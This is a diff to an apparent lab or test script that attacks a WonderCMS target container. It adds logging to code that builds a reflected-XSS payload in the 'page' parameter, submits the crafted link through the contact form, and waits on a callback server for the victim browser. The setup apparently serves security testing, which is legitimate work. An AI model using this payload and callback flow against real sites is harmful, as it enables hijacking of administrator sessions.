@@ -6,6 +6,7 @@ The attacker container is never given the admin password or target Flag.
 from __future__ import annotations
 
 import os
+import socket
 import threading
 import time
 import urllib.parse
@@ -36,6 +37,8 @@ class Handler(BaseHTTPRequestHandler):
         pass
 
 
+print("ATTACKER TEST START", flush=True)
+print("Target DNS:", socket.gethostbyname("wondercms-target"), flush=True)
 server = ThreadingHTTPServer(("0.0.0.0", CALLBACK_PORT), Handler)
 thread = threading.Thread(target=server.serve_forever, daemon=True)
 thread.start()
@@ -67,6 +70,7 @@ injection = 'loginURL?"></form><script>' + javascript + '</script><form action="
 crafted_path = "/index.php?page=" + urllib.parse.quote(injection, safe="?")
 crafted_url = TARGET + crafted_path
 
+print("Submitting crafted URL through contact form", flush=True)
 form = urllib.parse.urlencode({
     "name": "Editorial Review",
     "email": "learner@example.test",
@@ -80,6 +84,7 @@ with urllib.request.urlopen(request, timeout=8) as response:
     assert "submitted" in page.lower(), page[:300]
 print("PASS: crafted reflected-XSS URL accepted through the ordinary contact form", flush=True)
 
+print("Waiting for target-local browser callback", flush=True)
 deadline = time.time() + 70
 while time.time() < deadline and not received:
     time.sleep(0.5)
